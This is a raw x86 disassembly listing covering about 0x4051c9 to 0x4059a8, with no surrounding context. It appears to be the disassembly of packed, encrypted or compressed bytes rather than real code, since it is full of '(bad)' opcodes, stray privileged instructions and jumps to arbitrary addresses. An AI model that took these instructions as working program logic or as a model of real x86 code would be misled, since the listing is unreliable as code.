  4051c9:	(bad)  [ebx-0x2d]
  4051cc:	shl    DWORD PTR [edi-0x4a],1
  4051cf:	repnz call 0xa6a0:0x74cf58c0
  4051d7:	adc    ah,cl
  4051d9:	dec    ecx
  4051da:	aaa    
  4051db:	pop    ds
  4051dc:	push   edx
  4051dd:	pop    ebp
  4051de:	add    ebx,DWORD PTR [ecx-0x57]
  4051e1:	jnp    0x405258
  4051e3:	daa    
  4051e4:	inc    ebp
  4051e5:	in     al,0xea
  4051e7:	icebp  
  4051e8:	(bad)  
  4051ea:	and    dl,BYTE PTR [eax]
  4051ec:	jge    0x4051bb
  4051ee:	xchg   ebx,eax
  4051ef:	in     eax,0x41
  4051f1:	jne    0x4051e8
  4051f3:	test   DWORD PTR ds:0x3b5573d5,ebx
  4051f9:	mov    bl,0x9b
  4051fb:	jns    0x405272
  4051fd:	jb     0x4051ad
  4051ff:	cmp    DWORD PTR [eax-0x15e1ff1e],edx
  405205:	or     al,BYTE PTR [ebx-0x54fa363f]
  40520b:	hlt    
  40520c:	jo     0x405196
  40520e:	stos   DWORD PTR es:[edi],eax
  40520f:	push   ecx
  405210:	aaa    
  405211:	(bad)  
  405212:	je     0x4051e7
  405214:	aas    
  405215:	inc    ecx
  405216:	stos   DWORD PTR es:[edi],eax
  405217:	cdq    
  405218:	out    0xcb,al
  40521a:	or     BYTE PTR [edi-0xe],0x69
  40521e:	leave  
  40521f:	dec    ebp
  405220:	lods   al,BYTE PTR ds:[esi]
  405221:	mov    esp,0x6c2ab1cc
  405226:	mov    eax,0x604d61fc
  40522b:	cmp    edx,ecx
  40522d:	push   cs
  40522e:	clc    
  40522f:	pop    edi
  405230:	xchg   ebx,eax
  405231:	xchg   edx,eax
  405232:	and    ch,ch
  405234:	push   ecx
  405235:	stos   BYTE PTR es:[edi],al
  405236:	or     BYTE PTR [edx],dl
  405238:	sbb    bh,BYTE PTR [esi]
  40523a:	stc    
  40523b:	mov    dh,0x20
  40523d:	pop    ss
  40523e:	and    al,0xd1
  405240:	into   
  405241:	cs das 
  405243:	or     DWORD PTR [ebx-0x5b],0xffffffca
  405247:	adc    DWORD PTR [ebp+ecx*2-0x27],edx
  40524b:	rcl    DWORD PTR [ebx],cl
  40524d:	(bad)  
  40524e:	and    ebx,DWORD PTR [ecx*8-0x6b510b19]
  405255:	mov    edi,0x9a488c91
  40525a:	clc    
  40525b:	xor    BYTE PTR [ecx],bh
  40525d:	push   edi
  40525e:	add    al,0x36
  405260:	sahf   
  405261:	sti    
  405262:	shr    eax,cl
  405264:	call   0xbe7:0xae247449
  40526b:	xor    eax,0x4eb02200
  405270:	cmp    BYTE PTR [esi+0x653fcf36],0xef
  405277:	push   ebp
  405278:	fisubr DWORD PTR [ebp+0x76467afa]
  40527e:	leave  
  40527f:	sub    cl,BYTE PTR [ebx]
  405281:	stos   BYTE PTR es:[edi],al
  405282:	inc    BYTE PTR [ebx+0x79]
  405285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405286:	and    eax,0xbc417142
  40528b:	cmp    edi,DWORD PTR [ebp+0x542a5d67]
  405291:	xor    DWORD PTR [edi-0x23],0xffffffa4
  405295:	je     0x40523c
  405297:	or     eax,0xe9d5f6d6
  40529c:	push   esi
  40529d:	fbld   TBYTE PTR [eax+0x5f]
  4052a0:	and    BYTE PTR [edx+ebp*1],ah
  4052a3:	hlt    
  4052a4:	push   edx
  4052a5:	fsub   DWORD PTR [edx+ebx*1-0x557765ce]
  4052ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ad:	or     al,0x65
  4052af:	jge    0x405270
  4052b1:	or     edx,esi
  4052b3:	shl    BYTE PTR [ebx+0x7522c717],0x34
  4052ba:	aas    
  4052bb:	or     DWORD PTR [esi+0x4d6df532],esp
  4052c1:	mov    bl,0x74
  4052c3:	mov    ds:0xf66c5fbd,eax
  4052c8:	push   ebx
  4052c9:	dec    esi
  4052ca:	data16 mov dh,0x48
  4052cd:	into   
  4052ce:	cs in  al,0xbf
  4052d1:	push   esp
  4052d2:	fnstsw WORD PTR [ebx+0x6f7ce30f]
  4052d8:	and    eax,0x1a675aa3
  4052dd:	jae    0x405289
  4052df:	call   0xd3c736de
  4052e4:	dec    ebp
  4052e5:	cmp    BYTE PTR ds:0x5d30d53b,bh
  4052eb:	into   
  4052ec:	sti    
  4052ed:	lock test al,bl
  4052f0:	add    ch,BYTE PTR [edx+0x681d6d69]
  4052f6:	sbb    BYTE PTR [esi-0x6b3664c1],al
  4052fc:	xor    al,0xe
  4052fe:	shl    BYTE PTR [esi],1
  405300:	lods   al,BYTE PTR ds:[esi]
  405301:	mov    eax,ds:0x43b2d435
  405306:	ffree  st(4)
  405308:	outs   dx,BYTE PTR ds:[esi]
  405309:	stos   DWORD PTR es:[edi],eax
  40530a:	int    0xe8
  40530c:	jb     0x405364
  40530e:	pop    ss
  40530f:	dec    eax
  405310:	sub    esp,ebx
  405312:	mov    bh,0x10
  405314:	push   ds
  405315:	add    al,0x92
  405317:	xor    eax,0x8f49f98c
  40531c:	add    BYTE PTR [esi],dh
  40531e:	xchg   ebx,eax
  40531f:	rol    edi,cl
  405321:	dec    esi
  405322:	cs ins BYTE PTR es:[edi],dx
  405324:	rol    DWORD PTR [eax+0x22],cl
  405327:	xchg   edx,eax
  405328:	inc    dx
  40532a:	add    al,0xbc
  40532c:	and    al,0x86
  40532e:	and    eax,0x2a9b6da
  405333:	popf   
  405334:	xchg   ebx,eax
  405335:	js     0x4053ad
  405337:	sub    DWORD PTR [ebx],edx
  405339:	dec    esp
  40533a:	push   DWORD PTR [eax]
  40533c:	test   al,0xb7
  40533e:	pusha  
  40533f:	mov    dh,dl
  405341:	jbe    0x405397
  405343:	ins    DWORD PTR es:[edi],dx
  405344:	cwde   
  405345:	cmp    eax,0x7e5c7690
  40534a:	sbb    BYTE PTR [ecx-0x7a],dh
  40534d:	xor    DWORD PTR [esi-0x4d],edi
  405350:	mov    ebx,0x27a71324
  405355:	aam    0xff
  405357:	add    DWORD PTR [ecx],ebx
  405359:	mov    WORD PTR [edx+0x76],es
  40535c:	data16 add dh,BYTE PTR [edi+0x70]
  405360:	jp     0x4053b7
  405362:	rcl    BYTE PTR [ecx-0x2aa88a6a],0xb4
  405369:	(bad)  
  40536a:	fimul  WORD PTR [ecx+0x6ad26490]
  405370:	scas   eax,DWORD PTR es:[edi]
  405371:	jae    0x405304
  405373:	inc    ebp
  405374:	sbb    ecx,esi
  405376:	mov    WORD PTR [esi+0x78],ss
  405379:	ds adc al,0xb3
  40537c:	es aad 0x49
  40537f:	aam    0x86
  405381:	js     0x405379
  405383:	leave  
  405384:	jbe    0x40531e
  405386:	nop
  405387:	fdivrp st(3),st
  405389:	jnp    0x4053cf
  40538b:	xchg   esi,eax
  40538c:	clc    
  40538d:	jae    0x40530f
  40538f:	js     0x4053fd
  405391:	ja     0x4053ed
  405393:	call   0xd041:0xc588bb7
  40539a:	sar    DWORD PTR [esi],cl
  40539c:	retf   0x1a92
  40539f:	adc    DWORD PTR [ecx],eax
  4053a1:	sub    BYTE PTR [ecx],ah
  4053a3:	push   0x897f7c65
  4053a8:	push   cs
  4053a9:	fmul   DWORD PTR [edx+0x6e]
  4053ac:	ret    0x68bc
  4053af:	xchg   esp,eax
  4053b0:	pop    edi
  4053b1:	adc    DWORD PTR [eax-0x58],eax
  4053b4:	test   BYTE PTR [esi],0xc
  4053b7:	bound  eax,QWORD PTR [ecx-0x29]
  4053ba:	sbb    BYTE PTR [ecx+0x66e5c8bd],dl
  4053c0:	fist   WORD PTR [ebx]
  4053c2:	mov    ds:0xf97edfca,al
  4053c7:	mov    dh,0xe9
  4053c9:	clc    
  4053ca:	adc    al,0x56
  4053cc:	pop    ss
  4053cd:	retf   
  4053ce:	cli    
  4053cf:	inc    ebx
  4053d0:	repz sub eax,0x561329c1
  4053d6:	mov    bh,0xdd
  4053d8:	adc    eax,0x4e92d2af
  4053dd:	pop    edi
  4053de:	or     al,0x3b
  4053e0:	push   edx
  4053e1:	dec    ecx
  4053e2:	js     0x405377
  4053e4:	(bad)  
  4053e5:	mov    edx,0xfb46f24f
  4053ea:	mov    esi,0x814ef5bb
  4053ef:	pop    edx
  4053f0:	(bad)  
  4053f1:	fwait
  4053f2:	loop   0x40544f
  4053f4:	imul   esi,DWORD PTR [edx+0x58],0xfffffff0
  4053f8:	aam    0xab
  4053fa:	xchg   edx,ebp
  4053fc:	in     eax,0x9a
  4053fe:	xchg   edx,eax
  4053ff:	adc    eax,0xb4921280
  405404:	dec    edi
  405405:	es scas eax,DWORD PTR es:[edi]
  405407:	dec    eax
  405408:	jbe    0x405390
  40540a:	sbb    DWORD PTR ds:[eax+edx*1],0x4b
  40540f:	mov    ds:0xaa0bc646,al
  405414:	popa   
  405415:	push   ebp
  405416:	jnp    0x405445
  405418:	pop    ebp
  405419:	jno    0x4053b5
  40541b:	mov    ds:0xb5377bd,al
  405420:	iret   
  405421:	pop    es
  405422:	cmc    
  405423:	arpl   WORD PTR [eax+0x1d],dx
  405426:	fimul  DWORD PTR ds:0xf7eb0146
  40542c:	cmp    eax,0x7831017c
  405431:	or     bl,BYTE PTR [eax-0x5106070e]
  405437:	inc    ebp
  405438:	div    DWORD PTR [edx]
  40543a:	push   0xfffffff2
  40543c:	push   eax
  40543d:	ja     0x40540d
  40543f:	int    0x57
  405441:	test   eax,0xa553fdf6
  405446:	ficomp DWORD PTR [edx+0x7f]
  405449:	mov    dh,0xca
  40544b:	loop   0x40543f
  40544d:	(bad)
  405450:	or     al,0xac
  405452:	mov    bh,0xa7
  405454:	mov    ecx,0xd2c10499
  405459:	call   0x57e7cd17
  40545e:	vcvtsi2ss xmm7,xmm7,DWORD PTR [edx-0x4b53aef9]
  405466:	and    DWORD PTR [esp+eiz*8+0x7cd16ffb],edi
  40546d:	scas   al,BYTE PTR es:[edi]
  40546e:	ret    
  40546f:	mov    al,BYTE PTR [ecx+0x70]
  405472:	test   eax,0xb461ff01
  405477:	jecxz  0x405455
  405479:	xor    DWORD PTR [ebx],esi
  40547b:	pop    ecx
  40547c:	jnp    0x4054a8
  40547e:	(bad)  
  40547f:	sub    ah,BYTE PTR [esi+0x19a17c36]
  405485:	fist   DWORD PTR [ecx-0x54]
  405488:	rol    BYTE PTR [esp+ecx*4],0x3e
  40548c:	sub    DWORD PTR [eax],ebx
  40548e:	fwait
  40548f:	or     al,0x1e
  405491:	out    dx,eax
  405492:	cmc    
  405493:	mov    esp,ebx
  405495:	and    eax,0x11228699
  40549a:	ror    edx,0xe7
  40549d:	dec    esp
  40549e:	mov    edi,cs
  4054a0:	aam    0x7d
  4054a2:	cli    
  4054a3:	scas   al,BYTE PTR es:[edi]
  4054a4:	mov    esp,0x4f5c37d0
  4054a9:	fld    DWORD PTR [edi-0x122a493b]
  4054af:	sbb    eax,edx
  4054b1:	or     DWORD PTR [edx+edx*1],0x2
  4054b5:	(bad)  
  4054b6:	neg    BYTE PTR [edi-0x5143e75a]
  4054bc:	jnp    0x40544c
  4054be:	stc    
  4054bf:	xchg   DWORD PTR [edx-0x48],esp
  4054c2:	pop    es
  4054c3:	fs out dx,al
  4054c5:	xchg   esi,eax
  4054c6:	jg     0x405452
  4054c8:	fs or  al,0x4d
  4054cb:	jo     0x405500
  4054cd:	adc    BYTE PTR [esi-0x4b],0x5d
  4054d1:	out    dx,eax
  4054d2:	mov    edx,0x12014e12
  4054d7:	add    BYTE PTR ds:0x34639234,0x86
  4054de:	jno    0x405543
  4054e0:	mov    edx,0x4b611bce
  4054e5:	adc    DWORD PTR [ecx-0x2716eb84],0xffffffe9
  4054ec:	mov    ebp,0x43b3d78f
  4054f1:	mov    bh,0xd8
  4054f3:	push   edi
  4054f4:	jmp    0x39edbee4
  4054f9:	enter  0x5051,0xaa
  4054fd:	mov    DWORD PTR [edx*1+0x12b624db],ebx
  405504:	int    0xb8
  405506:	jnp    0x4054bf
  405508:	mov    ebx,0xb811d4e4
  40550d:	and    al,0x3d
  40550f:	sahf   
  405510:	or     eax,0x3cca64b3
  405515:	stos   DWORD PTR es:[edi],eax
  405516:	iret   
  405517:	ss pop edx
  405519:	add    eax,eax
  40551b:	test   DWORD PTR [esi],edx
  40551d:	push   0x4d385757
  405522:	xchg   BYTE PTR gs:[edi+eax*8-0x2953ed7],cl
  40552a:	daa    
  40552b:	and    DWORD PTR [eax-0x20117ab2],ebp
  405531:	adc    bh,BYTE PTR [edi]
  405533:	pop    ebp
  405534:	inc    esp
  405535:	sbb    BYTE PTR [eax],cl
  405537:	adc    esi,esp
  405539:	je     0x405578
  40553b:	xor    al,BYTE PTR [eax]
  40553d:	dec    esp
  40553e:	jle    0x405524
  405540:	in     eax,dx
  405541:	dec    esp
  405542:	ins    DWORD PTR es:[edi],dx
  405543:	inc    ebx
  405544:	fcmovne st,st(1)
  405546:	sbb    dh,BYTE PTR [ebx-0x515f5910]
  40554c:	mov    ds:0xf2d27291,eax
  405551:	retf   0x58fb
  405554:	jns    0x40551c
  405556:	add    al,0xbb
  405558:	aas    
  405559:	clc    
  40555a:	push   0xffffff80
  40555c:	lahf   
  40555d:	adc    DWORD PTR [esi],eax
  40555f:	stos   DWORD PTR es:[edi],eax
  405560:	cli    
  405561:	lea    ebp,[ecx+0x55]
  405564:	fisubr DWORD PTR [edx-0x51f0da04]
  40556a:	stos   BYTE PTR es:[edi],al
  40556b:	pushf  
  40556c:	cmp    BYTE PTR ds:0x4b0ab090,ch
  405572:	aad    0x32
  405574:	bound  ebp,QWORD PTR [ebx+0x6b3addf6]
  40557a:	mov    cl,0xdb
  40557c:	add    eax,ebx
  40557e:	cmp    eax,0xb104ab43
  405583:	popa   
  405584:	retf   0x9e06
  405587:	add    eax,0xf6fda752
  40558c:	cs jb  0x405555
  40558f:	fbld   TBYTE PTR ds:0x2aa3fdb8
  405595:	fdiv   DWORD PTR [ebx+ecx*1]
  405598:	cmp    BYTE PTR [ebx+0x4e],0x34
  40559c:	call   0x3714ec71
  4055a1:	ret    
  4055a2:	or     al,0x62
  4055a4:	cld    
  4055a5:	out    dx,al
  4055a6:	ins    BYTE PTR es:[edi],dx
  4055a7:	dec    ebp
  4055a8:	dec    esi
  4055a9:	and    al,0x74
  4055ab:	and    eax,0x76d0ab0a
  4055b0:	jp     0x405534
  4055b2:	jecxz  0x405580
  4055b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b5:	fisubr DWORD PTR [ebx]
  4055b7:	adc    dl,BYTE PTR [ebp-0x53]
  4055ba:	mov    cl,0x67
  4055bc:	sbb    BYTE PTR [eax+0x3c],dh
  4055bf:	jl     0x40563f
  4055c1:	ror    DWORD PTR [edi-0x6b],0x9e
  4055c5:	rcl    DWORD PTR [edi],cl
  4055c7:	xor    al,0x58
  4055c9:	pcmpgtb mm5,mm1
  4055cc:	imul   edx,DWORD PTR [edx-0x32],0x25
  4055d0:	in     al,dx
  4055d1:	sbb    eax,0x25759f34
  4055d6:	rcl    BYTE PTR [eax-0x26],1
  4055d9:	add    BYTE PTR [ebx+0x44bbfc2d],ah
  4055df:	jg     0x4055cb
  4055e1:	lahf   
  4055e2:	xor    edx,DWORD PTR ds:0x38a9bfa8
  4055e8:	jae    0x4055e6
  4055ea:	adc    eax,0xf3d61efb
  4055ef:	sahf   
  4055f0:	xchg   ebx,eax
  4055f2:	in     eax,0x81
  4055f4:	rcr    edi,1
  4055f6:	or     eax,0xb7ade4d4
  4055fb:	iret   
  4055fc:	add    BYTE PTR [ebp+eiz*2-0x2f],cl
  405600:	mov    cs,WORD PTR [edi]
  405602:	aaa    
  405603:	test   DWORD PTR [esi-0x57eee435],edi
  405609:	out    0x94,eax
  40560b:	jge    0x40561b
  40560d:	cli    
  40560e:	rol    BYTE PTR [edi],0x9a
  405611:	imul   ecx,DWORD PTR [ebx],0x1b
  405614:	add    esi,DWORD PTR [ebp-0x3f]
  405617:	mov    al,0x3b
  405619:	push   es
  40561a:	mov    ebp,0x59f701e4
  40561f:	fnsave [edx+0x70]
  405622:	aas    
  405623:	jb     0x405635
  405625:	pop    ebp
  405626:	ss jmpw 0xfca4
  40562b:	inc    ebx
  40562c:	push   ebx
  40562d:	loope  0x405629
  40562f:	add    eax,0x2f6cc88f
  405634:	imul   edi,DWORD PTR [esi],0xffffff98
  405637:	int    0x6f
  405639:	push   ecx
  40563a:	pop    esp
  40563b:	inc    edi
  40563c:	adc    DWORD PTR [edi+0x5d],edi
  40563f:	mov    bl,0x4f
  405641:	lahf   
  405642:	mov    esp,0x533248f0
  405647:	lds    ecx,FWORD PTR [eax+0x25175959]
  40564d:	pop    ds
  40564e:	dec    edx
  40564f:	stos   DWORD PTR es:[edi],eax
  405650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405651:	cwde   
  405652:	ins    BYTE PTR es:[edi],dx
  405653:	daa    
  405654:	pop    edx
  405655:	(bad)  
  405656:	mov    ah,0x2b
  405658:	repz inc ecx
  40565a:	and    BYTE PTR [esp+esi*1-0x72],bh
  40565e:	(bad)  
  40565f:	aas    
  405660:	fisttp QWORD PTR [edi-0x39]
  405663:	out    dx,al
  405664:	push   esp
  405665:	adc    eax,0x6e9931ae
  40566a:	imul   ebx,DWORD PTR [eax+0x4a],0xb9645b28
  405671:	hlt    
  405672:	mov    dh,0x96
  405674:	jmp    DWORD PTR [ebp-0x691a9327]
  40567a:	cmp    DWORD PTR [eax-0x16db9d96],0xb817337f
  405684:	mov    dl,0x85
  405686:	retf   
  405687:	jbe    0x4056cd
  405689:	and    ebx,esp
  40568b:	xchg   edi,eax
  40568c:	adc    dl,BYTE PTR [ecx-0x69]
  40568f:	pop    es
  405690:	pop    eax
  405691:	xchg   edi,eax
  405692:	repnz cmp al,bh
  405695:	or     al,0xac
  405697:	pop    es
  405698:	icebp  
  405699:	or     ebx,DWORD PTR [edi]
  40569b:	addr16 mov ebp,0xe74969c
  4056a1:	loopne 0x4056de
  4056a3:	xchg   esp,eax
  4056a4:	scas   al,BYTE PTR es:[edi]
  4056a5:	shl    esp,cl
  4056a7:	ins    BYTE PTR es:[edi],dx
  4056a8:	xor    ah,BYTE PTR cs:[esi-0x45]
  4056ac:	jp     0x405667
  4056ae:	dec    esi
  4056af:	mov    ebx,0x3d13ae8a
  4056b4:	push   esp
  4056b5:	adc    eax,0xa484072b
  4056ba:	and    eax,0x73c911e3
  4056bf:	adc    ch,0x9e
  4056c2:	int    0x59
  4056c4:	xchg   edx,eax
  4056c5:	or     DWORD PTR [edi+0x3cccc5ba],0x8
  4056cc:	mov    al,ds:0x31882ad1
  4056d1:	adc    al,0x98
  4056d3:	jno    0x405705
  4056d5:	shr    BYTE PTR [eax],cl
  4056d7:	(bad)  
  4056d8:	out    0x79,eax
  4056da:	nop
  4056db:	and    al,0x8d
  4056dd:	(bad)  
  4056de:	arpl   si,sp
  4056e0:	jmp    0x4056db
  4056e2:	or     eax,0xa8db4871
  4056e7:	cdq    
  4056e8:	adc    BYTE PTR [ebx+0x269d8a96],cl
  4056ee:	mov    ecx,0xd2f712f5
  4056f3:	xchg   edi,eax
  4056f4:	lahf   
  4056f5:	daa    
  4056f6:	mov    al,ds:0x6e177586
  4056fb:	dec    esp
  4056fc:	rol    BYTE PTR [edi],cl
  4056fe:	mov    cl,0x7f
  405700:	adc    BYTE PTR [ebx+0x7bfc313a],ch
  405706:	add    bl,al
  405708:	fxam   
  40570a:	push   0xffffffc7
  40570c:	outs   dx,BYTE PTR ds:[esi]
  40570d:	and    al,BYTE PTR [eax]
  40570f:	pop    eax
  405710:	sahf   
  405711:	fisttp QWORD PTR [edi]
  405713:	(bad)  
  405714:	mov    dl,0x33
  405716:	(bad)  
  405717:	push   ebp
  405718:	mov    WORD PTR [edx+0x4d],?
  40571b:	xchg   BYTE PTR [edi+ebp*1],ah
  40571e:	mov    al,ds:0x5dd52df3
  405723:	jecxz  0x405712
  405725:	xor    al,BYTE PTR [eax]
  405727:	jnp    0x405771
  405729:	jbe    0x40579b
  40572b:	loope  0x4056d7
  40572d:	repz mov esp,DWORD PTR [ebp+edx*2+0x7efe2a9c]
  405735:	jne    0x405799
  405737:	xlat   BYTE PTR ds:[ebx]
  405738:	loop   0x405795
  40573a:	add    BYTE PTR [ebx-0x13],ah
  40573d:	nop
  40573e:	les    ebx,FWORD PTR [ebp-0x27801c07]
  405744:	xchg   esp,eax
  405745:	xor    eax,0xea3d3e9d
  40574a:	xchg   edi,eax
  40574b:	push   ebx
  40574c:	adc    ah,cl
  40574e:	popa   
  40574f:	hlt    
  405750:	inc    ecx
  405751:	lods   al,BYTE PTR ds:[esi]
  405752:	addr16 jle 0x405756
  405755:	add    ecx,edi
  405757:	rcr    esi,0x4b
  40575a:	or     al,0xbb
  40575c:	ret    0x9921
  40575f:	fsubrp st(6),st
  405761:	loope  0x405713
  405763:	push   ebx
  405764:	adc    DWORD PTR ds:0xce44616b,edx
  40576a:	shr    DWORD PTR [edx+ecx*8+0x73],1
  40576e:	xor    al,0x7e
  405770:	adc    edi,esp
  405772:	imul   BYTE PTR [esi]
  405774:	aaa    
  405775:	pop    es
  405776:	pop    esp
  405777:	inc    esp
  405778:	cdq    
  405779:	and    al,0x48
  40577b:	or     edi,esp
  40577d:	pop    eax
  40577e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40577f:	in     al,dx
  405780:	mov    bl,0x3
  405782:	push   cs
  405783:	outs   dx,BYTE PTR ds:[esi]
  405784:	popa   
  405785:	jb     0x405784
  405787:	xchg   edx,eax
  405788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405789:	jne    0x405758
  40578b:	icebp  
  40578c:	data16 mov bl,0xb1
  40578f:	mov    ds:0x958a1c05,al
  405794:	jmp    0x23bf:0x4ec6c8b3
  40579b:	aam    0xc0
  40579d:	stos   BYTE PTR es:[edi],al
  40579e:	add    BYTE PTR [edx+edi*4-0x5e],ch
  4057a2:	data16 jno 0x4057e4
  4057a5:	gs das 
  4057a7:	jmp    0x74d7:0x998eb2a1
  4057ae:	adc    dl,ah
  4057b0:	cmc    
  4057b1:	dec    esi
  4057b2:	mov    dh,0x44
  4057b4:	dec    ebp
  4057b5:	pop    ebx
  4057b6:	mov    edi,0x93948512
  4057bb:	dec    esi
  4057bc:	fwait
  4057bd:	xor    BYTE PTR [edi+esi*1+0x546e66b3],0xde
  4057c5:	inc    edx
  4057c6:	cli    
  4057c7:	shl    edx,cl
  4057c9:	mov    WORD PTR [edi+ecx*4+0x17a0290f],cs
  4057d0:	ret    
  4057d1:	pusha  
  4057d2:	xchg   edx,eax
  4057d3:	dec    ebx
  4057d4:	jo     0x40584a
  4057d6:	mov    esp,0x724ec0ed
  4057db:	sub    BYTE PTR [edx+eax*8],bh
  4057de:	icebp  
  4057df:	mov    bl,0xc2
  4057e1:	lds    edx,FWORD PTR [ebx-0x139ad1c4]
  4057e7:	ins    DWORD PTR es:[edi],dx
  4057e8:	xlat   BYTE PTR ds:[ebx]
  4057e9:	or     DWORD PTR [edi+0x3293170d],edx
  4057ef:	jge    0x4057d7
  4057f1:	mov    eax,ds:0xe2a933bb
  4057f6:	jno    0x4057b2
  4057f8:	adc    BYTE PTR [eax],dh
  4057fa:	adc    bl,BYTE PTR [eax]
  4057fc:	mov    DWORD PTR [ecx],edi
  4057fe:	mov    ds:0x14f4bc34,eax
  405803:	addr16 xchg esi,eax
  405805:	clc    
  405806:	fs lahf 
  405808:	push   0xffffffde
  40580a:	int3   
  40580b:	adc    bl,0xca
  40580e:	and    DWORD PTR [edi+ecx*4-0x60],edx
  405812:	cmp    al,0xe8
  405814:	mov    ch,0xc7
  405816:	arpl   WORD PTR gs:[ebx+0x40],ax
  40581a:	xchg   ebp,eax
  40581b:	xchg   edi,eax
  40581c:	cs int3 
  40581e:	dec    ebx
  40581f:	ins    BYTE PTR es:[edi],dx
  405820:	pop    edi
  405821:	enter  0x3746,0x6b
  405825:	sbb    eax,0x1acb89a8
  40582a:	mov    ?,WORD PTR ds:[ebp-0x2]
  40582e:	popf   
  40582f:	ret    
  405830:	sahf   
  405831:	adc    eax,eax
  405833:	lea    eax,[esi]
  405835:	lods   eax,DWORD PTR ds:[esi]
  405836:	adc    al,0xaf
  405838:	int3   
  405839:	mov    eax,ds:0xb2d10620
  40583e:	ficom  DWORD PTR ds:0xf9a63845
  405844:	fist   DWORD PTR [ebx]
  405846:	pop    es
  405847:	daa    
  405848:	in     eax,0xdf
  40584a:	and    bh,BYTE PTR [ebp+0x48]
  40584d:	stc    
  40584e:	mov    dl,0xcb
  405850:	push   esp
  405851:	out    dx,al
  405852:	(bad)  
  405853:	popa   
  405854:	jmp    0x6f776603
  405859:	or     al,0xfd
  40585b:	add    al,0xf6
  40585d:	ss dec esp
  40585f:	out    0xcd,al
  405861:	or     al,bh
  405863:	dec    esi
  405864:	sbb    al,0xd2
  405866:	lds    esi,FWORD PTR [edi-0x4f65f08f]
  40586c:	xor    dh,BYTE PTR ds:0x7971f76f
  405872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405873:	sbb    BYTE PTR [ebp-0x4f],dh
  405876:	pop    ds
  405877:	jo     0x405886
  405879:	xor    al,0x84
  40587b:	mov    edx,0xe9b85c6e
  405880:	pop    eax
  405881:	add    bh,BYTE PTR [edx+0x7bacdaa6]
  405887:	loopne 0x405841
  405889:	jge    0x405866
  40588b:	into   
  40588c:	int    0xa7
  40588e:	jle    0x40588a
  405890:	(bad)  
  405892:	sub    DWORD PTR [esi],edx
  405894:	cdq    
  405895:	stos   DWORD PTR es:[edi],eax
  405896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405897:	in     al,dx
  405898:	or     DWORD PTR [edx-0x2b],esp
  40589b:	pop    edx
  40589c:	shl    BYTE PTR [eax+0x39],cl
  40589f:	ins    DWORD PTR es:[edi],dx
  4058a0:	dec    edx
  4058a1:	rol    al,1
  4058a3:	aad    0xab
  4058a5:	inc    esi
  4058a6:	sub    eax,0x7b3fcc0d
  4058ab:	ret    0xfd64
  4058ae:	cmovge ebp,DWORD PTR [eax-0x511207f7]
  4058b5:	or     al,0xae
  4058b7:	iret   
  4058b8:	mov    es,WORD PTR [ecx+0x4398b851]
  4058be:	jge    0x4058f5
  4058c0:	cmp    DWORD PTR [edx],0xffffff92
  4058c3:	jle    0x405933
  4058c5:	aam    0xe
  4058c7:	in     al,dx
  4058c8:	leave  
  4058c9:	sbb    BYTE PTR [edx+0x17],bh
  4058cc:	adc    al,0x32
  4058ce:	and    ebx,DWORD PTR [ebp-0x1b]
  4058d1:	cmp    ebp,eax
  4058d3:	scas   eax,DWORD PTR es:[edi]
  4058d4:	jp     0x405877
  4058d6:	mov    cl,0xa7
  4058d8:	inc    ebx
  4058d9:	push   ds
  4058da:	ror    ecx,1
  4058dc:	rcl    BYTE PTR [ebp-0x5e456e33],0x3b
  4058e3:	add    al,BYTE PTR [ecx-0x5e]
  4058e6:	adc    eax,0xd1d9ad26
  4058eb:	stos   DWORD PTR es:[edi],eax
  4058ec:	cwde   
  4058ed:	push   esp
  4058ee:	sub    DWORD PTR [eax-0x21011fde],0xcf0a41e4
  4058f8:	sbb    eax,0xb63ff5bc
  4058fd:	and    eax,0x8cc7331c
  405902:	daa    
  405903:	sub    BYTE PTR [edx-0x4e995e7],0x26
  40590a:	pop    ecx
  40590b:	lods   eax,DWORD PTR ds:[esi]
  40590c:	enter  0xfcd3,0x1
  405910:	xchg   DWORD PTR [ebx+0x3ae0546e],ebx
  405916:	pop    esi
  405917:	std    
  405918:	aad    0xdb
  40591a:	cmp    BYTE PTR [eax],dh
  40591c:	jne    0x4058ec
  40591e:	xor    DWORD PTR [esi+edx*2-0x727c2946],edx
  405925:	jg     0x40599a
  405927:	ficom  DWORD PTR [edx+ecx*2]
  40592a:	scas   eax,DWORD PTR es:[edi]
  40592b:	fcomip st,st(0)
  40592d:	ss jle 0x405932
  405930:	mov    ah,0xaf
  405932:	stos   DWORD PTR es:[edi],eax
  405933:	pushf  
  405934:	xchg   esp,eax
  405935:	xchg   ebp,eax
  405936:	dec    edi
  405937:	inc    ebp
  405938:	mov    ah,0x1a
  40593a:	out    dx,al
  40593b:	mov    edi,DWORD PTR [ebx-0x78912d57]
  405941:	lock lods eax,DWORD PTR ds:[esi]
  405943:	sahf   
  405944:	sbb    eax,0x59ecd499
  405949:	out    dx,al
  40594a:	mov    ebx,0x63c4b76a
  40594f:	jecxz  0x40590c
  405951:	adc    BYTE PTR [eax+0x27980993],ah
  405957:	scas   eax,DWORD PTR es:[edi]
  405958:	pop    eax
  405959:	xchg   esi,eax
  40595a:	mov    ?,ecx
  40595c:	jb     0x40590c
  40595e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40595f:	(bad)  [ebp+0x7a8eec35]
  405965:	inc    edx
  405966:	and    BYTE PTR [ebx+0x73],0x37
  40596a:	lahf   
  40596b:	psubd  mm3,QWORD PTR [ebx+0x233315a9]
  405972:	add    BYTE PTR [edi+0x2],0xf9
  405976:	jns    0x4059ca
  405978:	xchg   edi,eax
  405979:	fdiv   QWORD PTR [ecx-0x7694801f]
  40597f:	xor    DWORD PTR [edx+0x6a],ebx
  405982:	inc    ebp
  405983:	(bad)  
  405985:	or     DWORD PTR [ecx-0x64ef6c55],ebx
  40598b:	rcl    BYTE PTR [ecx+ebx*4-0x3fb08a85],0x5b
  405993:	dec    ebp
  405994:	fcmovnu st,st(3)
  405996:	xor    eax,0xb2d717bc
  40599b:	test   DWORD PTR [edi-0x35],0xcd641240
  4059a2:	les    eax,FWORD PTR [edi+0x6b]
  4059a5:	cdq    
  4059a6:	out    dx,al
  4059a7:	cld    
  4059a8:	out    0x4c,al
